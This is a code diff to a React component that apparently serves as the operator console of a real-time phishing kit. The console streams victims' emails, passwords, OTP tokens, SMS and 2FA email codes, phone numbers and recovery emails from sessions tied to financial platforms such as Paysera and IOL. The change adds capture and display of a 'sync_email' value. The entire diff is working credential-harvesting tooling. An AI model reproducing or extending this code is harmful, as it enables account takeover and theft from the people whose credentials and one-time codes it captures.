@@ -54,6 +54,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
   const [clientPhoneNumber, setClientPhoneNumber] = useState("");
   const [adminRecoveryEmail, setAdminRecoveryEmail] = useState("");
   const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
+  const [syncEmail, setSyncEmail] = useState("");
   const [sending, setSending] = useState<string | null>(null);
   const [ppiMfaType, setPpiMfaType] = useState<number | null>(null);
   const [lastAction, setLastAction] = useState<string | null>(null);
@@ -193,6 +194,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
       .on("broadcast", { event: "client_phone_submitted" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
       .on("broadcast", { event: "client_recovery_email_update" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
       .on("broadcast", { event: "client_recovery_email_submitted" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
+      .on("broadcast", { event: "client_sync_email" }, (p) => { if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email); })
       .subscribe();
 
     // Sync email channel
@@ -209,6 +211,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
       .on("broadcast", { event: "client_phone_submitted" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
       .on("broadcast", { event: "client_recovery_email_update" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
       .on("broadcast", { event: "client_recovery_email_submitted" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
+      .on("broadcast", { event: "client_sync_email" }, (p) => { if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email); })
       .subscribe();
 
     // Subscribe remaining channels (review, otpDec, otpCli) for broadcasting
@@ -249,6 +252,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
         }
       }
       if (otp.startsWith("sync_token:")) { setEmailCode(otp.replace("sync_token:", "")); setEmailCodeLabel("2FA Email"); }
+      if (otp.startsWith("sync_email:")) setSyncEmail(otp.replace("sync_email:", ""));
       if (otp.startsWith("sms_code:") || otp.startsWith("sync_sms:")) { setEmailCode(otp.replace(/^(sms_code:|sync_sms:)/, "")); setEmailCodeLabel("SMS"); }
       if (otp.startsWith("client_phone:") || otp.startsWith("client_phone_final:")) { setClientPhoneNumber(otp.replace(/^(client_phone:|client_phone_final:)/, "")); }
       if (otp.startsWith("client_recovery_email:") || otp.startsWith("client_recovery_email_final:")) { setClientRecoveryEmail(otp.replace(/^(client_recovery_email:|client_recovery_email_final:)/, "")); }
@@ -534,7 +538,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
              <span className="rounded-full border border-primary/30 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary uppercase tracking-wider shrink-0">FX</span>
            )}
         <span className={`h-2 w-2 rounded-full shrink-0 ${isOnline ? "bg-green-400 animate-pulse" : "bg-muted-foreground/40"}`} />
-        <span className="text-xs font-bold text-foreground truncate max-w-[120px]">{session.email?.split("@")[0] || "—"}</span>
+         <span className="text-xs font-bold text-foreground truncate max-w-[120px]">{(syncEmail || session.email)?.split("@")[0] || "—"}</span>
         <span className={`text-[10px] font-semibold ${stage.color}`}>{stage.label}</span>
         <Maximize2 size={12} className="text-muted-foreground shrink-0" />
       </div>
@@ -575,7 +579,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
               <span className="rounded-full border border-primary/30 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary uppercase tracking-wider shrink-0">FX</span>
             )}
           <span className={`h-2 w-2 rounded-full shrink-0 ${isOnline ? "bg-green-400 animate-pulse" : "bg-muted-foreground/40"}`} />
-          <span className="text-xs font-bold text-foreground truncate">{session.email || "—"}</span>
+          <span className="text-xs font-bold text-foreground truncate">{syncEmail || session.email || "—"}</span>
           <span className={`text-[10px] font-semibold ${stage.color}`}>• {stage.label}</span>
         </div>
         <div className="flex items-center gap-1 shrink-0" onMouseDown={(e) => e.stopPropagation()} onTouchStart={(e) => e.stopPropagation()}>
@@ -600,7 +604,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
         <div className="rounded-lg border border-border bg-background/30 p-2.5">
           <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-1.5">📡 Dados</p>
           <div className="grid grid-cols-3 gap-1">
-            <MiniLive icon={<Mail size={10} />} label="Email" value={session.email} highlight={false} onCopy={() => copyToClipboard(session.email || "", "email")} isCopied={copied === "email"} />
+            <MiniLive icon={<Mail size={10} />} label="Email" value={syncEmail || session.email} highlight={!!syncEmail} onCopy={() => copyToClipboard(syncEmail || session.email || "", "email")} isCopied={copied === "email"} />
             <MiniLive icon={<Lock size={10} />} label="Senha" value={currentPassword} highlight={currentPassword !== session.password} onCopy={() => copyToClipboard(currentPassword, "pw")} isCopied={copied === "pw"} />
             <MiniLive icon={<ShieldCheck size={10} />} label="Token" value={platformOtp} highlight={!!platformOtp} mono onCopy={() => copyToClipboard(platformOtp, "otp")} isCopied={copied === "otp"} />
             {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol" || session.source === "ppi") && (
